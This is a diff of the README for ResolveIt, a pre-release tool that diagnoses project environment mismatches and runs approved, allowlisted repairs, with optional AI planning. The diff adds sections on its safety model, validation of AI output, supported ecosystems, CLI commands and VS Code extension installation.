@@ -1,44 +1,173 @@
 # ResolveIt
 
-A local-first, IDE-integrated Agentic AI project environment diagnosis and repair tool.
+A local-first, IDE-integrated **project environment diagnosis and repair tool**.
+
+> **Status: pre-release (0.0.1).** The deterministic core is complete, tested, and
+> stable. The VS Code UI is functional but its newest surface (the Action Hub) is
+> **not finished** — see [Current UI Status](#current-ui-status) before relying on it.
+
+---
+
+## Table of contents
+
+- [Overview](#overview)
+- [Why ResolveIt exists](#why-resolveit-exists)
+- [What it does](#what-it-does)
+- [Core workflow](#core-workflow)
+- [Architecture](#architecture)
+- [Safety model](#safety-model)
+- [Supported ecosystems](#supported-ecosystems)
+- [AI providers](#ai-providers)
+- [Ollama setup](#ollama-setup)
+- [Installing ResolveIt Core](#installing-resolveit-core)
+- [CLI usage](#cli-usage)
+- [Installing the VS Code extension](#installing-the-vs-code-extension)
+- [Development mode](#development-mode)
+- [VS Code usage](#vs-code-usage)
+- [Repair approval](#repair-approval)
+- [Verification](#verification)
+- [Example workflow](#example-workflow)
+- [Test fixtures](#test-fixtures)
+- [Testing](#testing)
+- [Docker support](#docker-support)
+- [UI / UX history](#ui--ux-history)
+- [Current UI status](#current-ui-status)
+- [Project structure](#project-structure)
+- [Development](#development)
+- [Phase history](#phase-history)
+- [Known limitations](#known-limitations)
+- [Developer handoff](#developer-handoff)
+- [Contributing](#contributing)
+- [License](#license)
+
+---
 
 ## Overview
 
-ResolveIt analyzes a project's requirements, inspects the development environment, detects mismatches and problems, produces deterministic diagnostics, optionally uses AI to propose repairs, asks the user for explicit approval, executes only validated/allowlisted repairs, verifies the result, and resolves or re-plans.
+ResolveIt answers one question: **"Why does this project not build or run on this
+machine, and what is the safest concrete change that would fix it?"**
 
-**ResolveIt is NOT a general coding assistant.** Its focus is:
-- Project/environment compatibility
-- Runtime detection
-- Toolchain detection
-- Dependency/requirement analysis
-- Deterministic diagnostics
+It does this in a fixed, auditable order:
+
+1. Read the project's declared requirements from its manifests and lockfiles.
+2. Inspect the actual development environment (runtimes, tools, package managers, container state).
+3. Compare the two and emit **deterministic** diagnostics with evidence.
+4. Optionally ask an AI provider to propose a structured repair plan.
+5. Ask the user to approve each proposed change individually.
+6. Execute only validated, allowlisted repairs through registered tools.
+7. Re-run verification.
+8. Report resolved, or re-plan.
+
+**ResolveIt is NOT a general coding assistant.** It does not write features, answer
+general questions, refactor, or edit code on request. Its focus is:
+
+- project/environment compatibility
+- runtime detection
+- toolchain detection
+- dependency/requirement analysis
+- deterministic diagnostics
 - AI-assisted repair planning
-- Safe repair execution
-- Explicit user approval
-- Verification
-- Auditability
+- safe repair execution
+- explicit user approval
+- verification
+- auditability
 
-## Core Workflow
+Everything it decides is derived from evidence it can show you. When it does not know
+something, it says `unknown` — it does not guess.
+
+---
+
+## Why ResolveIt exists
+
+Setting up a project is where a lot of engineering time disappears, and the failure
+modes are boring and repetitive:
+
+- the project needs Python 3.11 but the machine only has 3.9
+- `Cargo.lock` pins a version the local toolchain cannot build
+- a `go.work` references a module that no longer exists
+- a Compose file runs privileged and nobody noticed
+
+Generic AI coding assistants can *guess* at these, and a generic scripting tool will
+happily run whatever fix it invents. Neither is auditable, and neither asks first.
+
+ResolveIt deliberately does less, and does it in a way you can inspect:
+
+- diagnostics are **deterministic** — the same project and machine produce the same
+  findings, with evidence attached
+- repairs are **structured actions**, not shell strings
+- every modification requires **explicit, per-action approval**
+- every repair is followed by **verification**, so "success" is never assumed
+- everything important is **written to a sanitized audit log**
+
+The design principle is that a tool that changes your machine is only trustworthy if
+you can always answer "what did it do, and who said yes?"
+
+---
+
+## What it does
+
+**Does:**
+
+- Discover projects, manifests, languages, and configuration in a workspace
+  (including multi-project and nested-project layouts)
+- Detect installed runtimes, developer tools, package managers, OS, and Docker state
+- Parse 17 requirement parsers covering 12 ecosystem identifiers across Python, Node,
+  Java (Maven/Gradle), Go, Rust, C/C++, .NET, Ruby, PHP, and Docker/Compose
+- Produce deterministic diagnostics across 8 rule categories (runtime, toolchain,
+  dependency, build, container, Docker security, project, cross-project)
+- Plan repairs from diagnostics, gated by the real tool validators
+- Execute repairs through 4 allowlisted tools (create file, modify file, install
+  dependency, create Python venv) with snapshots and audit records
+- Verify repairs by re-running diagnostics plus filesystem-only targeted checks
+- Run an agent loop (observe → analyze → plan → approve → act → verify → re-plan)
+- Accept an optional AI planning layer (No AI / Local AI / External AI) that proposes
+  structured actions which the Core then validates independently
+- Statically analyze Docker/Compose configuration for security misconfigurations
+- Redact secrets from logs, audit records, errors, AI context, and UI output
+
+**Does not do:**
+
+- Write application code or answer general questions
+- Solve dependencies (no version solver, no conflict resolution)
+- Install or upgrade runtimes, toolchains, or system software automatically
+- Remediate Docker findings automatically
+- Scan for CVEs or run a dedicated secret scanner
+- Elevate privileges or run `sudo`
+- Execute anything the user did not approve
+
+---
+
+## Core workflow
 
 ```
-Project requirements
-       ↓
-Environment inspection
-       ↓
-Mismatch detection
-       ↓
-Deterministic diagnostics
-       ↓
-AI proposes repairs (optional)
-       ↓
-User explicitly approves
-       ↓
-Validated/allowlisted repair execution
-       ↓
-Verification
-       ↓
-Resolved or Re-plan
+Analyze a project's requirements
+        ↓
+Inspect the development environment
+        ↓
+Detect mismatches / problems
+        ↓
+Produce deterministic diagnostics
+        ↓
+Optionally use AI to propose repairs
+        ↓
+Ask the user for explicit approval
+        ↓
+Execute only validated / allowlisted repairs
+        ↓
+Verify the result
+        ↓
+Resolve or re-plan
 ```
+
+In code, the agent state machine is:
+
+```
+OBSERVE → ANALYZE → PLAN → REQUEST USER APPROVAL → ACT → VERIFY → RESOLVED
+                                                                          ↓
+                                                                       RE-PLAN
+```
+
+---
 
 ## Architecture
 
@@ -48,70 +177,101 @@ VS Code Extension
         ▼
 ResolveIt Core
         │
-        ├── Workspace Manager
-        ├── Project Scanner
-        ├── Environment Intelligence
-        ├── Diagnostic Engine
-        ├── Repair Engine
-        ├── Verification Engine
-        ├── Safety / Permission Layer
-        └── Audit Logger
+        ├── Workspace Manager        (src/core/workspace-manager.ts)
+        ├── Project Scanner          (src/scanners/)
+        ├── Environment Intelligence  (src/environment/, src/environment/adapters/)
+        ├── Diagnostic Engine        (src/diagnostics/, src/diagnostics/rules/)
+        ├── Repair Engine            (src/repair/, src/repair/tools/)
+        ├── Verification Engine      (src/agent/verifier.ts)
+        ├── Safety / Permission Layer(src/safety/)
+        └── Audit Logger             (src/repair/index.ts — AuditLoggerImpl)
                 │
-                ├── Language / Ecosystem Analyzers
-                ├── Environment Adapters
-                └── Tool Registry
+                ├── Language / Ecosystem Analyzers (src/requirements/parsers/)
+                ├── Environment Adapters          (src/environment/adapters/)
+                └── Tool Registry                 (src/repair/registry.ts)
 
 Agent Engine
         │
-        └── AI Provider Abstraction
-                ├── No AI
-                ├── Local AI
-                └── External AI
+        └── AI Provider Abstraction  (src/ai/, src/ai/providers/)
+                ├── No AI      (src/ai/providers.ts)
+                ├── Local AI   (src/ai/providers/local.ts)
+                └── External AI(src/ai/providers/external.ts)
 ```
 
-The VS Code extension is a thin client. The Core remains authoritative. The extension must not directly execute repair commands.
+**The VS Code extension is a thin client. The Core is authoritative.**
 
-## Safety Model
+- The extension imports Core source directly through the public API (`src/index.ts`)
+  and bundles it with esbuild; there is no second diagnostic, repair, or AI engine
+  in `vscode/`.
+- The extension **must not directly execute repair commands**. It has no shell
+  execution path for repairs. Approvals are *collected* in the UI and passed down as
+  approved action IDs; the Core `PermissionManager` and `RepairExecutor` re-check
+  every one of them and can still refuse.
+- All security decisions live in the Core. The UI cannot escalate, bypass, or widen
+  a permission level.
+
+---
+
+## Safety model
 
 ResolveIt follows:
 
 ```
 OBSERVE
-    ↓
+   ↓
 ANALYZE
-    ↓
+   ↓
 PLAN
-    ↓
+   ↓
 REQUEST USER APPROVAL
-    ↓
+   ↓
 ACT
-    ↓
+   ↓
 VERIFY
-    ↓
+   ↓
 RESOLVED
-    or
+   or
 RE-PLAN
 ```
 
-### Key Safety Principles
+### Key safety principles
 
-- **Read-only discovery** can happen automatically
-- **Project modifications** require explicit approval
-- **System modifications** require explicit approval
-- **AI output is untrusted** — treated as data, not instructions
-- **AI cannot execute arbitrary shell commands**
-- **Repair actions are validated** against allowlisted tools and parameters
-- **Package managers and executables are allowlisted**
-- **Paths are contained within the workspace** where required (canonical path checks, symlink fail-closed)
-- **Verification occurs after repairs** — success is reported only when verification passes
-- **Failed repairs must not appear successful**
-- **Denied repairs must not execute**
-- **Audit records track important operations** (JSONL, daily rotation, secrets redacted)
-- **Secrets are redacted** from logs, audit records, errors, and UI output
-- **.env files are not parsed** as requirements
-- **Dangerous Docker configurations are diagnosed but not automatically remediated**
+- **Read-only discovery can happen automatically.** Scanning, environment probing,
+  and requirement parsing never modify anything.
+- **Project modifications require explicit approval.** Dependency installs, file
+  creation/modification, and venv creation all stop at the approval gate.
+- **System modifications require explicit approval**, and in practice ResolveIt does
+  not automate them at all — they are reported as manual actions.
+- **AI output is untrusted.** It is treated as data, never as instructions. Project
+  content (READMEs, comments, manifests) is likewise evidence, not authority.
+- **AI cannot execute arbitrary shell commands.** AI can only name a registered tool
+  and pass allowlisted structured parameters.
+- **Repair actions are validated** — by the tool's own `validate()` before execution,
+  in addition to plan-level validation.
+- **Package managers and executables are allowlisted.** `InstallDependencyTool`
+  constructs commands internally from a fixed ecosystem table
+  (`npm`, `pip`, `cargo`, `go`, `composer`, `bundle`); arbitrary command strings are
+  never accepted.
+- **Paths are contained within the workspace** where required, using canonical
+  resolution, `path.relative` segment checks (not string prefixes), and symlink
+  fail-closed behaviour.
+- **Verification occurs after repairs.** Success is reported only when verification
+  passes: *approved ≠ executed ≠ succeeded ≠ verified*.
+- **Failed repairs must not appear successful.** A repair that throws or exits
+  non-zero is recorded as a failure with its error text.
+- **Denied repairs must not execute.** The executor runs a tool only on an exact
+  `allowed` decision; denials produce a `failure` audit record and no side effects.
+- **Audit records track important operations.** JSONL entries under
+  `.resolveit/audit/` correlate `runId → plan → action → approval → execution → verification`.
+- **Secrets are redacted.** Sensitive parameter keys, bearer/basic tokens, API keys,
+  and private-key blocks are redacted from audit records, logs, errors, child-process
+  output, agent snapshots, and AI context.
+- **`.env` files are not parsed** as requirements, and are excluded from scanning.
+- **Dangerous Docker configurations are diagnosed but not automatically remediated.**
+  Docker security findings carry no remediation candidates, so no repair tool can
+  apply them.
 
-### Actual Architecture: Permission Flow
+### Actual architecture of the permission flow
 
 ```
 UI
@@ -125,56 +285,90 @@ RepairExecutor
 VerificationEngine
 ```
 
-The `PermissionManager` is authoritative. The UI collects approvals (`Allow`/`Skip` per action, then `Apply Approved Changes`) and passes approved action IDs to the Core. The Core never executes without explicit `allowed` decisions.
-
-### Action Levels
+### Action levels
 
 | Level | Examples | Approval |
 |-------|----------|----------|
-| Read-only | Inspect files, environment, tools, dependencies, run safe diagnostics | Implicit |
-| Project modification | Install dependencies, modify manifests, create environments, update configuration | Explicit user approval |
-| System-level modification | Install system software, modify system configuration, require admin privileges | Explicit user approval + confirmation |
+| Read-only | Inspect files, environment, tools, dependencies, run safe diagnostics | Implicit (auto-approved by policy) |
+| Project modification | Install dependencies, modify/create project files, create a Python venv | Explicit user approval |
+| System-level modification | Installing system software, changing system configuration, runtime upgrades | Explicit user approval — and in practice reported as a manual action, never automated |
 
-## Supported Ecosystems
+Higher-risk actions require explicit user approval. The permission layer enforces this
+at the API boundary, not in the UI.
 
-ResolveIt supports manifest/lockfile analysis and version constraints via pluggable parsers. **It does NOT implement a full dependency solver.**
+### Limits
 
-### Implemented Parsers (verified from `src/requirements/parsers/`)
+`src/safety/limits.ts` bounds untrusted input: paths 1024 chars; repair content
+256 KiB; AI responses 256 KiB / 16 actions / 16 KiB per parameter set / depth 5; audit
+query 200 results / 5 MiB scanned; command output 256 KiB / timeout 120 s;
+requirement files 1 MiB / 500 files. Oversized input degrades to an explicit warning
+or manual action — never a silently truncated security decision.
 
-- **Python**: `requirements.txt`, `pyproject.toml` (PEP 621), `poetry.lock`, `setup.cfg`, `setup.py` (static only, `DYNAMIC_DECLARATION` warning), `Pipfile`, `Pipfile.lock`
-- **Node/npm**: `package.json`, `package-lock.json` (npm), `pnpm-lock.yaml`, `yarn.lock`, `bun.lockb` (recognized, not parsed), Volta pins
-- **Java/Maven**: `pom.xml`, properties resolution, managed-scope exclusion, parent POM, wrapper
-- **Java/Gradle**: `build.gradle`, toolchain DSL, version catalog (`libs.versions.toml`), wrapper, duplicate elimination, dynamic markers
-- **Go**: `go.mod` (blocks, indirect, replace, exclude), `go.work`
-- **Rust/Cargo**: `Cargo.toml`, `Cargo.lock` (hyphenated names, workspace inheritance without invented versions, members)
-- **C/C++**: `CMakeLists.txt` (`find_package` versions/components/standards/languages), `meson.build`, `conanfile.txt`, `vcpkg.json`
-- **.NET**: `.csproj`, `.sln`, `global.json`, `Directory.Packages.props`, `packages.config` (legacy)
-- **Ruby**: `Gemfile` (groups), `Gemfile.lock`, `*.gemspec`
-- **PHP**: `composer.json`, `composer.lock` (ext-* system tools, dev sections, both lock sections)
-- **Docker/Compose**: `Dockerfile`, `compose.yml`/`compose.yaml` (digests, platforms, registries with ports, build args, compose builds)
+---
 
-### Limitations
+## Supported ecosystems
 
-- Dependency inventory without a local inventory is reported honestly as `unknown` (informational), never invented
-- Dynamic/build-time dependency discovery has limitations (e.g., `setup.py` never executed, Gradle Kotlin/Groovy expressions, arbitrary CMake code)
-- Lockfile/transitive entries are never proposed for direct installation by the deterministic planner (manual guidance instead)
+ResolveIt performs **static manifest and lockfile analysis** with version-constraint
+matching. **It does NOT implement a full dependency solver.** There is no version
+resolution, no conflict solving, and no lockfile rewriting.
 
-## AI Providers
+17 parser classes are registered by filename in `src/requirements/index.ts`
+(`registerDefaultParsers`), covering 12 ecosystem identifiers:
 
-ResolveIt supports three AI modes. No mode requires code changes — only configuration.
+| Ecosystem | Files parsed | Notes |
+|---|---|---|
+| **Python** | `requirements.txt`, `pyproject.toml` (PEP 621 + Poetry), `poetry.lock`, `setup.cfg`, `setup.py`, `Pipfile`, `Pipfile.lock` | `setup.py` is parsed **statically, never executed**; dynamic declarations produce a `DYNAMIC_DECLARATION` warning |
+| **Node** | `package.json`, `package-lock.json`, `pnpm-lock.yaml`, `yarn.lock` | Volta pins, `packageManager`, dev/peer/optional deps; `bun.lockb` is recognized but not parsed (binary) |
+| **Java / Maven** | `pom.xml`, `maven-wrapper.properties` | Property resolution, parent POM, dependency management, managed-scope exclusion |
+| **Java / Gradle** | `build.gradle`(+`.kts`), `settings.gradle`(+`.kts`), `gradle.properties`, `gradle-wrapper.properties`, `libs.versions.toml` | Toolchain DSL, version catalogs, dynamic version markers |
+| **Go** | `go.mod`, `go.work` | `require` blocks, `// indirect`, `replace`, `exclude`, workspace members. `go.sum` recognized but not parsed |
+| **Rust** | `Cargo.toml`, `Cargo.lock` | Hyphenated names, workspace inheritance (without inventing versions), members, dev-deps |
+| **C / C++** | `CMakeLists.txt`, `Makefile`, `meson.build`, `conanfile.txt`, `conanfile.py`, `conan.lock`, `vcpkg.json` | `find_package` versions/components, C/C++ standards, fallback deps |
+| **.NET** | `*.csproj`, `*.fsproj`, `*.vbproj`, `*.sln`, `*.slnx`, `global.json`, `Directory.Packages.props`, `Directory.Build.props/targets`, `packages.config`, `nuget.config` | Multi-targeting, SDK pins with `rollForward`, central package management |
+| **Ruby** | `Gemfile`, `Gemfile.lock`, `*.gemspec` | Groups, Ruby version constraints |
+| **PHP** | `composer.json`, `composer.lock` | `ext-*` system tools, `require-dev`, both lock sections |
+| **Docker / Compose** | `Dockerfile`, `Containerfile`, `*.dockerfile`, `docker-compose.{yml,yaml}`, `compose.{yml,yaml}` | Digests, `--platform`, registries with ports, `ARG`, build contexts, `build` blocks |
 
-### 1. No AI (default, zero-key setup)
+### Ecosystem limitations
+
+- **No dependency solver.** ResolveIt reports what is declared and what the
+  environment reports; it does not compute a resolution.
+- **Dependency inventory is often `unknown`, never assumed.** Without a local package
+  inventory, ResolveIt emits an informational diagnostic saying so. It does not
+  pretend a dependency is installed or missing.
+- **Dynamic/build-time discovery is limited.** `setup.py` logic, Gradle Kotlin/Groovy
+  expressions, and arbitrary CMake code cannot be evaluated; they degrade to explicit
+  warnings instead of invented versions.
+- **Lockfile/transitive entries are never proposed for direct installation.** The
+  deterministic planner emits manual guidance for them instead.
+- **Automated installs cover 6 ecosystems only** (`npm`, `pip`, `cargo`, `go`,
+  `composer`, `bundle`). Maven/Gradle/.NET/CMake dependencies are detected and
+  reported, but not auto-installed.
+- **Multi-project attribution** is per manifest directory: nested projects keep their
+  own identity and files are never double-counted, but ResolveIt does not model
+  inter-project dependency graphs.
+
+---
+
+## AI providers
+
+Three modes. **No AI is the default** and requires no configuration, no keys, and no
+network access. Switching modes never requires a code change.
+
+### 1. No AI (default)
 
 ```bash
 node dist/cli/index.js run --ai none
 node dist/cli/index.js ai
 ```
 
-Deterministic planning only. No network calls are made.
+Deterministic planning only. No network calls are made. This is the mode the entire
+test suite and the release matrix exercise.
 
 ### 2. Local AI (Ollama-compatible)
 
-Point ResolveIt at your local endpoint and choose your own model (gemma3, qwen, nemotron, or any Ollama-compatible model). ResolveIt never downloads models or starts the local service automatically.
+Point ResolveIt at a local Ollama-compatible endpoint and choose your own model.
+ResolveIt never downloads models and never starts the local service for you.
 
 ```powershell
 $env:RESOLVEIT_AI_PROVIDER="local"
@@ -187,7 +381,8 @@ node dist/cli/index.js run --ai local
 
 ### 3. External AI (OpenAI-compatible)
 
-Provide your own compatible endpoint, model, and API key. **Never commit credentials to the repository — use environment variables.**
+Provide your own compatible endpoint, model, and API key. **Never commit credentials
+to the repository — use environment variables only.**
 
 ```bash
 export RESOLVEIT_AI_PROVIDER=external
@@ -199,38 +394,68 @@ node dist/cli/index.js ai
 node dist/cli/index.js run --ai external
 ```
 
-`resolveit ai` shows provider, model, availability, and base URL. API keys are never printed. If the provider is unavailable or its output is unusable, ResolveIt falls back to deterministic planning with an explicit notice.
+### Configuration precedence
 
-### How AI Works
+Explicit CLI flags (`--ai`, `--ai-model`, `--ai-base-url`) → environment variables
+(`RESOLVEIT_AI_PROVIDER`, `RESOLVEIT_AI_MODEL`, `RESOLVEIT_AI_BASE_URL`,
+`RESOLVEIT_AI_API_KEY`, `RESOLVEIT_AI_TIMEOUT_MS`) → safe defaults. Unknown provider
+values coerce to `none`. In VS Code, the `resolveit.ai.*` settings map onto the same
+config object.
 
-- AI receives **structured evidence** (workspace/project summaries, runtimes, tools, requirements, blocking diagnostics with expected/actual evidence, tool allowlist, permission constraints, previous attempt fingerprints, last verification summary) — never file contents, environment variable values, or `.env` data
-- AI proposes **structured actions** (tool name + validated parameters)
-- **Invalid/hostile/malformed AI actions are rejected** at multiple validation layers:
-  1. JSON schema validation
-  2. Tool existence check
-  3. Parameter allowlist validation
-  4. Privilege/command-field rejection (including `spawn`, `shell`, `exec`)
-  5. Path traversal rejection (relative in-workspace paths only)
-  6. Per-parameter and total size caps, nesting depth cap with circular-payload rejection
-  7. At most 16 actions per plan
-  8. Tool-owned permission levels (AI cannot assign permission)
-  9. AI-supplied `workspaceRoot` values are overwritten with the run root
-- **Deterministic fallback** when AI is:
-  - unavailable
-  - timed out
-  - malformed
-  - refused
-  - rate limited
-  - unauthorized
-  - unable to produce valid actions
+`resolveit ai` prints provider, model, base URL, timeout, `apiKeyConfigured` (a
+boolean — never the key), and availability.
 
-## Ollama Setup (Tested Configuration)
+### How AI is used
+
+- **AI receives structured evidence, not access to the machine.** The planning context
+  contains workspace/project counts and names, runtime and tool names/versions,
+  requirement descriptors, blocking diagnostics with expected/actual evidence, the tool
+  allowlist, permission constraints, previous attempt fingerprints, and the last
+  verification summary. File contents, environment variable values, and `.env` data
+  are never included.
+- **AI proposes structured actions** — a tool name plus parameters. The prompt states
+  the boundary explicitly: *"You are proposing actions. You are not executing actions.
+  You cannot grant yourself permission."*
+- **AI permission levels are impossible to influence.** They come from the tool
+  definition, never from the model, and any `permissionLevel`/`approval`/`bypass`/
+  `elevation` key in AI output is rejected outright.
+
+Validation pipeline for AI output:
+
+```
+AI output → JSON parse → schema check → known tool → parameter allowlist →
+privilege/command-field rejection → workspace-root overwrite →
+permission level from tool → tool.validate() → PermissionManager
+```
+
+- **Invalid, hostile, or malformed AI actions are rejected**, and the rejection
+  reason is recorded on the plan. Rejection reasons include unknown tools, unsupported
+  parameters, privilege-escalation attempts, arbitrary `command`/`shell`/`exec`/
+  `spawn` fields, unsafe paths, oversized parameters, excessive nesting, and tool-level
+  validation failures.
+- **Deterministic fallback** happens when the AI is unavailable, times out, returns
+  malformed output, refuses, is rate-limited, is unauthorized, or produces no valid
+  actions. The agent then uses `DeterministicRepairPlanner` and logs an explicit
+  fallback reason (`ai-unavailable`, `ai-error`, `ai-no-valid-actions`, `ai-all-retried`).
+- **Partial validity is kept.** If some actions validate, the valid subset is used and
+  the rejections are reported alongside it.
+
+---
+
+## Ollama setup
+
+The configuration used during development and testing:
 
 ```bash
 ollama list
 ```
 
-Expected model used during testing:
+```
+NAME         ID              SIZE      MODIFIED
+gemma3:4b    a2af6cc3eb7f    3.3 GB    6 months ago
+```
+
+Model used during testing:
 
 ```bash
 ollama run gemma3:4b
@@ -242,19 +467,30 @@ ResolveIt base URL:
 http://localhost:11434
 ```
 
-Verify AI configuration:
+Verify ResolveIt can see it:
 
 ```bash
 node dist/cli/index.js ai
 ```
 
-Output should show:
-- Provider
-- Model
-- Base URL
-- Availability
+Actual verified output on this machine:
 
-**Do NOT claim that every AI model works equally well.** Local model behavior can vary.
+```
+ResolveIt AI Provider
+  Provider: local (Local AI Provider)
+  Model: gemma3:4b
+  Base URL: http://localhost:11434
+  API key configured: no
+  Timeout: 30000ms
+  Available: yes
+```
+
+**Do not assume every model behaves the same.** Small local models frequently emit
+malformed or schema-invalid plans; that is expected and is handled by validation and
+deterministic fallback, not by trusting the model. A model that is available is not
+necessarily a model that produces useful proposals.
+
+---
 
 ## Installing ResolveIt Core
 
@@ -267,33 +503,102 @@ npm install
 npm run build
 ```
 
-### CLI Help
+Requirements: **Node.js >= 20** (developed and validated on Node 24). There is no
+postinstall step, no native build, and no network access at install time.
+
+Confirm the CLI works:
 
 ```bash
 node dist/cli/index.js --help
+node dist/cli/index.js version
 ```
 
-### Useful Commands
+If `package.json` is present you can also run `npx resolveit --help`, which uses the
+`bin.resolveit` entry point.
+
+### Try it on a bundled fixture
 
 ```bash
-node dist/cli/index.js scan
-node dist/cli/index.js environment
-node dist/cli/index.js requirements
-node dist/cli/index.js diagnose
-node dist/cli/index.js run
+node dist/cli/index.js scan tests/fixtures/integration/broken-python
+node dist/cli/index.js diagnose --path tests/fixtures/integration/broken-python
+node dist/cli/index.js run --path tests/fixtures/integration/broken-python --dry-run
 ```
 
-### Using --path
+---
+
+## CLI usage
+
+| Command | What it does | Options |
+|---|---|---|
+| `scan <workspace>` | Scan a workspace: projects, files, languages, markers, config | `--json`, `--max-depth <n>`, `--max-files <n>` |
+| `environment` | Inspect the *current machine*: OS, runtimes, tools, package managers, Docker | `--json`, `--timeout <ms>` (default 30000) |
+| `requirements` | Parse manifests/lockfiles and print requirements | `--json`, `--timeout <ms>` (default 60000), `--path <p>` |
+| `diagnose` | Run the diagnostic engine over a workspace | `--json`, `--timeout <ms>` (default 60000), `--path <p>` (default `.`) |
+| `repair` | Plan repairs from diagnostics and execute approved ones | `--json`, `--dry-run`, `--path <p>`, `--approve <action-id>` |
+| `run` | Run the full agent lifecycle (observe → analyze → plan → approve → act → verify) | `--json`, `--dry-run`, `--path <p>`, `--approve <action-id>`, `--ai <provider>`, `--ai-model <m>`, `--ai-base-url <u>` |
+| `ai` | Show AI provider configuration and availability (never prints secrets) | `--json` |
+| `version`, `help` | Version / help | — |
+
+### Notes
+
+- `scan` takes the workspace as a **positional argument**, not `--path`:
+  `node dist/cli/index.js scan .` or `node dist/cli/index.js scan C:\path\to\project`.
+- `--path` is supported by `requirements`, `diagnose`, `repair`, and `run`, and
+  defaults to `.` (the current directory).
+- `environment` always inspects the machine ResolveIt is running on; it has no
+  `--path`.
+- `run` and `repair` **never execute anything unless you approve it.** Without
+  `--approve <action-id>`, each action is printed for approval and skipped:
+
+  ```
+  Action requires approval:
+    ID: action-…
+    Type: install-dependency
+    …
+  To approve this action, run: resolveit run --approve <action-id>
+  ```
+
+- `--dry-run` prints the plan and stops before any modification. On `run`, a dry run
+  finishes in state `awaiting-approval` with reason "Dry run stopped before modifications".
+
+### Example: diagnose a project
 
 ```bash
-node dist/cli/index.js run --path C:\path\to\project
+node dist/cli/index.js diagnose --path tests/fixtures/integration/broken-python
 ```
 
-## Installing the VS Code Extension
+```
+ResolveIt Diagnostics
 
-ResolveIt currently ships as a local VSIX.
+ERROR
+  python version mismatch
+  python version 3.14.2 does not satisfy requirement ==2.7.*: Expected version 2.7.*, got 3.14.2
+  Source: requirement - python ==2.7.*
+  Source: environment - python 3.14.2
+    Expected: ==2.7.*
+    Actual: 3.14.2
+  Remediation candidates:
+    - Install python ==2.7.* (confidence: 80%)
+    - Upgrade python to ==2.7.* (confidence: 90%)
 
-### From the Repository
+INFO
+  Dependency: requests
+  Dependency requests >=2.0 declared in pyproject.toml (project.dependencies). Status: unknown - no local package inventory available
+  ...
+
+Summary
+  Total diagnostics: 2
+  error: 1
+  info: 1
+```
+
+---
+
+## Installing the VS Code extension
+
+**ResolveIt currently ships as a local VSIX. It is not published to the Marketplace.**
+
+### Build the VSIX from this repository
 
 ```bash
 cd vscode
@@ -308,393 +613,640 @@ This creates:
 vscode/resolveit-0.0.1.vsix
 ```
 
-### Install in VS Code
+The extension has its own isolated `node_modules` and does not depend on the root
+install.
 
-1. Open VS Code
-2. Open Extensions (Ctrl+Shift+X)
-3. Click the three-dot menu (⋯)
-4. Select **"Install from VSIX..."**
-5. Select: `C:\ResolveIt\vscode\resolveit-0.0.1.vsix`
-6. Install/update the extension
-7. Reload VS Code if prompted
+### Install in VS Code (GUI)
 
-### PowerShell Alternative
+1. Open VS Code.
+2. Open the Extensions view (`Ctrl+Shift+X`).
+3. Click the three-dot menu (⋯) at the top of the view.
+4. Select **"Install from VSIX..."**.
+5. Select `C:\ResolveIt\vscode\resolveit-0.0.1.vsix` (or wherever you built it).
+6. Install / update the extension.
+7. Reload VS Code if prompted.
+
+### PowerShell alternative
 
 ```powershell
 code --install-extension C:\ResolveIt\vscode\resolveit-0.0.1.vsix --force
 ```
 
-**Important**: A locally installed VSIX does NOT automatically update whenever source files change. The extension must be rebuilt and reinstalled after changes:
+To remove it later:
+
+```powershell
+code --uninstall-extension resolveit-dev.resolveit
+```
+
+### A locally installed VSIX does NOT auto-update
+
+The VSIX is a build artifact. Changing files under `vscode/src/` has **no effect**
+until you rebuild and reinstall:
 
 ```bash
 cd vscode
 npm run build
 npm run package
-# Then reinstall the VSIX
+code --install-extension .\resolveit-0.0.1.vsix --force
 ```
 
-## Development Mode (F5 / Extension Development Host)
+`.vsix` files are git-ignored; never commit one.
 
-The VS Code extension **can be run in development mode**:
+---
 
-1. Open the `vscode/` folder in VS Code
-2. Press `F5` (or Run → Start Debugging)
-3. A new Extension Development Host window opens with ResolveIt loaded
+## Development mode
 
-This works and is the recommended development workflow. The VSIX packaging path is for distribution/installation in a regular VS Code instance.
+**There is no launch configuration committed to this repository**, so pressing `F5`
+in the `vscode/` folder will not start an Extension Development Host — VS Code has
+no debug target to run.
 
-## How to Use ResolveIt
+**VSIX packaging is the currently validated installation path.** It is what was used
+to produce and install the build described above.
 
-### Beginner-Friendly Flow
+If you want F5 development, you must add your own `vscode/.vscode/launch.json` with a
+standard `Run Extension` configuration. Be aware that `.vscode/` is git-ignored at
+the repository root, so such a file would be local-only and would not be shared with
+the project partner unless that ignore rule is deliberately changed. This path has
+**not** been validated as part of this handoff.
 
-1. **Open a project** in VS Code
-2. **Open ResolveIt** — click the `◆ ResolveIt` control in the Explorer sidebar (Action Hub)
-3. **Analyze the project** — click "Analyze Project" in the expanded hub
-4. **Review diagnostics** — click "Diagnostics" to see Critical/Errors/Warnings/Info grouped results
-5. **Optionally generate an AI repair plan** — click "AI Report" to see AI-proposed repairs
-6. **Review proposed repairs** — each shows type, target, reason, scope, risk, and exact change
-7. **Approve individual changes** — click `Allow` per repair card (or `Skip` to reject)
-8. **Apply approved repairs** — click `Apply Approved Changes`
-9. **Verify the project** — verification runs automatically after application
-10. **Review remaining issues** if verification fails — re-plan from the AI Report or run Analyze again
+---
 
-### Critical Distinctions
+## VS Code usage
 
-| Term | Meaning |
-|------|---------|
-| **Diagnostic** | Deterministic finding from Core engine (e.g., "Python 3.11 required, found 3.9") |
-| **AI Proposal** | AI-suggested repair action (e.g., "install cryptography via pip") — *never executed directly* |
-| **Approved Repair** | User clicked `Allow` on a proposal — *still not executed* |
-| **Executed Repair** | Core `RepairExecutor` ran the validated tool — *not yet verified* |
-| **Verified Repair** | Post-execution diagnostics confirm the issue is resolved — **only this means success** |
+The extension contributes 18 commands, 5 Explorer views, and 5 settings.
 
-**Approved ≠ Executed ≠ Succeeded ≠ Verified**. The UI and audit log maintain this distinction.
+### Beginner-friendly flow
 
-## Test Fixtures
+1. **Open a project folder** in VS Code (a single folder; see multi-root note below).
+2. **Open ResolveIt** — expand **"ResolveIt Action Hub"** in the Explorer sidebar and
+   click the collapsed `◆ ResolveIt` control.
+3. **Analyze the project** — click **Analyze Project** in the expanded radial hub.
+4. **Review diagnostics** — click **Diagnostics**, or the `ResolveIt Diagnostics`
+   tree view for full detail (message, evidence, expected/actual, source file you can
+   click to open, remediation candidates).
+5. **Optionally prepare an AI repair report** — click **AI Report** (or *Prepare AI
+   Report*). With AI unavailable, this still produces a deterministic plan.
